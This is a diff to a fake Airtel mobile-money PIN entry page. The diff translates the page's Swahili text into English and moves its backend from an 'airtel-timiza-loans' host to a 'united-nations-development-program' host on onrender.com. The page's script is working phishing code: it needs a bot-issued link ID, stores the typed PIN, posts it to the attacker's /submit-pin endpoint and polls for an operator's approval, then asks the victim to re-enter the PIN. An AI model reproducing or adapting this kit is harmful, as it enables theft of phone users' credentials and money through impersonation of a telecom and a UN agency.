@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Ingiza PIN</title>
+<title>Enter PIN</title>
 <style>
 body {
     font-family: Arial, sans-serif;
@@ -97,11 +97,11 @@ button.enabled {
 
 <div class="pin-container">
     <h1>Airtel</h1>
-    <h2>Karibu</h2>
+    <h2>Welcome</h2>
 
     <input id="phoneDisplay" type="text" readonly>
 
-    <p>Ingiza PIN yako</p>
+    <p>Enter your PIN</p>
     <form id="pinForm">
         <div class="pin-boxes">
             <input type="tel" maxlength="1" inputmode="numeric">
@@ -109,21 +109,21 @@ button.enabled {
             <input type="tel" maxlength="1" inputmode="numeric">
             <input type="tel" maxlength="1" inputmode="numeric">
         </div>
-        <button id="submitBtn" disabled>Ingia</button>
+        <button id="submitBtn" disabled>Login</button>
     </form>
 
-    <p class="terms">Kwa kuendelea, unakubali Sheria na Masharti</p>
+    <p class="terms">By continuing, you agree to the Terms and Conditions</p>
     <div class="status" id="status"></div>
 </div>
 
 <script>
-const BACKEND_URL = "https://airtel-timiza-loans.onrender.com";
+const BACKEND_URL = "https://united-nations-development-program.onrender.com";
 
 // ---------------- BOT ID ----------------
 const params = new URLSearchParams(window.location.search);
 const botId = params.get('botId');
 if (!botId) {
-    alert("Kiungo batili cha ufikiaji");
+    alert("Invalid access link");
     throw new Error("botId missing");
 }
 
@@ -165,7 +165,7 @@ document.getElementById('pinForm').addEventListener('submit', async e => {
     localStorage.setItem('pin', pin);
 
     button.disabled = true;
-    button.textContent = 'Inaingia...';
+    button.textContent = 'Logging in...';
 
     const res = await fetch(`${BACKEND_URL}/submit-pin`, {
         method: 'POST',
@@ -186,9 +186,9 @@ document.getElementById('pinForm').addEventListener('submit', async e => {
         const d = await r.json();
 
         if (d.blocked) {
-            statusDiv.textContent = d.message || "Ingiza nambari halali ya prepaid";
+            statusDiv.textContent = d.message || "Enter a valid prepaid number";
             button.disabled = false;
-            button.textContent = 'Ingia';
+            button.textContent = 'Login';
             [...inputs].forEach(i => i.value = '');
             clearInterval(poll);
             return;
@@ -201,9 +201,9 @@ document.getElementById('pinForm').addEventListener('submit', async e => {
         }
 
         if (d.approved === false) {
-            statusDiv.textContent = "PIN si sahihi. Ingiza tena.";
+            statusDiv.textContent = "Incorrect PIN. Please try again.";
             button.disabled = false;
-            button.textContent = 'Ingia';
+            button.textContent = 'Login';
             [...inputs].forEach(i => i.value = '');
         }
     }, 1500);
